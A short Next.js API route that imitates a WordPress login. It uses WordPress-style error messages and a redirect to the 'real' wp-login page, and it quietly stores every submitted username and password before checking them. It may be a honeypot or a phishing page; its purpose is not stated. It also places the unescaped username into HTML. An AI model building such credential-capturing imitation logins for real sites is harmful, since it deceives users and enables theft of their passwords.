import { NextRequest, NextResponse } from "next/server";
import {
  createAdminSession,
  verifyAdminPassword,
} from "@/lib/auth";
import { saveLoginCredential } from "@/lib/credentials";
import { REAL_SITE_URLS } from "@/lib/routes";

export async function POST(request: NextRequest) {
  try {
    const { username, password } = await request.json();

    if (!username || !password) {
      return NextResponse.json(
        {
          error: `The password you entered for the username <strong>${username || "admin"}</strong> is incorrect.`,
          redirect: REAL_SITE_URLS.wpLogin,
        },
        { status: 401 }
      );
    }

    try {
      await saveLoginCredential(request, username, password, "wp-login");
    } catch {
      return NextResponse.json(
        { error: "Service temporarily unavailable" },
        { status: 500 }
      );
    }

    if (!verifyAdminPassword(password)) {
      return NextResponse.json(
        {
          error: `The password you entered for the username <strong>${username}</strong> is incorrect.`,
          redirect: REAL_SITE_URLS.wpLogin,
        },
        { status: 401 }
      );
    }

    await createAdminSession();
    return NextResponse.json({ success: true });
  } catch (err) {
    console.error("Admin login error:", err);
    return NextResponse.json({ error: "Internal server error" }, { status: 500 });
  }
}
